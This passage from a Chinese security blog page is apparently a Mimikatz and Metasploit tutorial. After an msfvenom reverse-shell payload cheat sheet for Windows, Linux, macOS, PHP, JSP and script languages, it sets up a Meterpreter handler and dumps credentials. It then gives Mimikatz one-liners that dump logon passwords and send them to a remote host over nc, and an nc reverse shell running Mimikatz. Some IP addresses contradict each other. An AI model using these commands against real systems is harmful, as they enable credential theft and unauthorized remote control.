On&gt; -f exe &gt; shell.exe</span><br><span class="line">Mac：msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</span><br><span class="line">PHP：msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</span><br><span class="line">asp：msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</span><br><span class="line">JSP：msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</span><br><span class="line">WAR：msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</span><br><span class="line">Scripting Payloads</span><br><span class="line">Python：msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</span><br><span class="line">Bash：msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</span><br><span class="line">Perl：msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</span><br><span class="line">Linux Based Shellcode：msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br><span class="line">Windows Based Shellcode：msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br><span class="line">Mac Based Shellcode：msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure></p>
+<p>在架构中比较好用的有两个cmd/powershell_base64和x86/shikata_ga_nai，下面生成一个实例（反弹的服务器 IP 为 192.168.126.142):<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.106.133 LPORT=4444 -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure></p>
+<p>运行 msfconsole 并设置：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.106.133</span><br><span class="line">set lport 4444</span><br><span class="line">run或者exploit</span><br></pre></td></tr></table></figure>
+<p>在测试计算机上运行 exe 文件。<br>在 msf 获取反弹的 shell，如下：</p>
+<p>getuid 获取当前帐号为系统权限，则进行后续操作，否则通过 ps 命令去获取小于 1000 以内的 pid，执行 migrate pid 来提升权限后，继续执行后续步骤。<br>load mimikatz //启动</p>
+<p>运行 mimikatz 下面的凭证获取命令：</p>
+<p>kerberos       获取网络认证协议凭证，其中可能会有明文密码<br>  msv            获取msv 凭证，其中包含LM和NTLM哈希密码值<br>  wdigest         获取wdigest （摘要式身份验证）凭证，其中可能会有明文密码<br>可以执行 hashdump 来导出系统的哈希密码值。</p>
+<h1 id="Mimikatz-使用技巧"><a href="#Mimikatz-使用技巧" class="headerlink" title="Mimikatz 使用技巧"></a>Mimikatz 使用技巧</h1><h2 id="获取并记录密码到-mimikatz-log-文件"><a href="#获取并记录密码到-mimikatz-log-文件" class="headerlink" title="获取并记录密码到 mimikatz.log 文件"></a>获取并记录密码到 mimikatz.log 文件</h2><p><code>mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;log sekurlsa::logonpasswords &quot;&quot; exit &amp;&amp; dir</code></p>
+<h2 id="输出到本地-log-txt-文件"><a href="#输出到本地-log-txt-文件" class="headerlink" title="输出到本地 log.txt 文件"></a>输出到本地 log.txt 文件</h2><p><code>mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;sekurlsa::logonpasswords&quot;&quot; exit &gt;&gt; log.txt</code></p>
+<h2 id="记录新密码到文件"><a href="#记录新密码到文件" class="headerlink" title="记录新密码到文件"></a>记录新密码到文件</h2><p>有时候获取的哈希是旧的，这时需要记录新的登录哈希值，可以使用以下命令来记录，记录的结果在 c:\windows\system32\mimilsa.log。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line">privilege::debug</span><br><span class="line">misc::memssp</span><br></pre></td></tr></table></figure></p>
+<h2 id="通过-nc-命令将-mimikatz-执行结果传输到远程"><a href="#通过-nc-命令将-mimikatz-执行结果传输到远程" class="headerlink" title="通过 nc 命令将 mimikatz 执行结果传输到远程"></a>通过 nc 命令将 mimikatz 执行结果传输到远程</h2><p>取结果服务器（192.168.126.142）执行监听命令<br><code>nc -vlp 44444</code></p>
+<h2 id="在想获取密码的服务器上执行"><a href="#在想获取密码的服务器上执行" class="headerlink" title="在想获取密码的服务器上执行"></a>在想获取密码的服务器上执行</h2><p><code>mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;sekurlsa::logonpasswords &quot;&quot; exit | nc.exe -vv 192.168.106.145 4444</code></p>
+<h2 id="通过-nc-命令远程执行-mimikatz"><a href="#通过-nc-命令远程执行-mimikatz" class="headerlink" title="通过 nc 命令远程执行 mimikatz"></a>通过 nc 命令远程执行 mimikatz</h2><p>在黑客反弹计算机（192.168.126.130）上执行 nc.exe -vlp 4444；<br>在被攻击计算机（192.168.126.142）上执行 nc.exe -vv 192.168.126.142 4444 -e mimikatz.exe。<br>接着就会反弹到 192.168.126.130 的 4444 端口，出来一个 cmd 的窗口，可以在该窗口进行密码获取.</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+      <div>
+        <div id="wechat_subscriber" style="display: block; padding: 10px 0; margin: 20px auto; width: 100%; text-align: center">
+    <img id="wechat_subscriber_qcode" src="/uploads/td.jpg" alt="Franci4 wechat" style="width: 200px; max-width: 100%;"/>
+    <div>订阅我的博客通过扫描我的公众聊天帐户</div>
+</div>
+
+      </div>
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/工具/" rel="tag"><i class="fa fa-tag"></i> 工具</a>
+          
+            <a href="/tags/web安全/" rel="tag"><i class="fa fa-tag"></i> web安全</a>
+          
+            <a href="/tags/TOOLS/" rel="tag"><i class="fa fa-tag"></i> TOOLS</a>
+          
+            <a href="/tags/渗透测试/" rel="tag"><i class="fa fa-tag"></i> 渗透测试</a>
+          
+            <a href="/tags/目录扫描/" rel="tag"><i class="fa fa-tag"></i> 目录扫描</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/TOOLS/WEB应用程序/WEB爬行/DIRB.html" rel="next" title="DIRB">
+                <i class="fa fa-chevron-left"></i> DIRB
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/uploads/touxiang.jpg"
+                alt="Franci4" />
+            
+              <p class="site-author-name" itemprop="name">Franci4</p>
+              <p class="site-description motion-element" itemprop="description">沧海桑田一声笑，一人独走这王道</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/Franci4" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:Franci4@qq.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://weibo.com/u/5893061168" target="_blank" title="微博">
+                      
+                        <i class="fa fa-fw fa-weibo"></i>微博</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.zhihu.com/people/61df8c034abd3423fcf9ce997c0c4ab7" target="_blank" title="知乎">
+                      
+                        <i class="fa fa-fw fa-gratipay"></i>知乎</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#简介"><span class="nav-number">1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Mimikatz参数"><span class="nav-number">2.</span> <span class="nav-text">Mimikatz参数</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#使用模块"><span class="nav-number">3.</span> <span class="nav-text">使用模块</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Mimikatz-获取密码"><span class="nav-number">4.</span> <span class="nav-text">Mimikatz 获取密码</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MSF-下-Mimikatz-获取密码"><span class="nav-number">5.</span> <span class="nav-text">MSF 下 Mimikatz 获取密码</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Mimikatz-使用技巧"><span class="nav-number">6.</span> <span class="nav-text">Mimikatz 使用技巧</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#获取并记录密码到-mimikatz-log-文件"><span class="nav-number">6.1.</span> <span class="nav-text">获取并记录密码到 mimikatz.log 文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#输出到本地-log-txt-文件"><span class="nav-number">6.2.</span> <span class="nav-text">输出到本地 log.txt 文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#记录新密码到文件"><span class="nav-number">6.3.</span> <span class="nav-text">记录新密码到文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#通过-nc-命令将-mimikatz-执行结果传输到远程"><span class="nav-number">6.4.</span> <span class="nav-text">通过 nc 命令将 mimikatz 执行结果传输到远程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#在想获取密码的服务器上执行"><span class="nav-number">6.5.</span> <span class="nav-text">在想获取密码的服务器上执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#通过-nc-命令远程执行-mimikatz"><span class="nav-number">6.6.</span> <span class="nav-text">通过 nc 命令远程执行 mimikatz</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Franci4</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">18.6k</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:<span id="busuanzi_value_site_uv"></span>次
+</span>
+</div>
+<span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("NOsxifftUsvpBxvrIaNvW0sI-gzGzoHsz", "Yhpk7qvNx2sUWM5d8vstvpRu");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
